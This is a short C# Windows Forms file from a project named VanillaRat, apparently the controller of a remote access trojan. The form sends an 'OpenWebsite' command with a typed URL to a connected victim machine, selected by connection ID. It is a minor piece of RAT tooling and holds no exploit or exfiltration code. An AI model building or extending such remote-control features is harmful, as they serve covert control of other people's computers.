using System;
using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class OpenWebsite : Form
    {
        public OpenWebsite()
        {
            InitializeComponent();
        }

        public int ConnectionID { get; set; }

        //Open website
        private void btnOpen_Click(object sender, EventArgs e)
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("OpenWebsite(" + txtLink.Text + ")"));
            Close();
        }
    }
}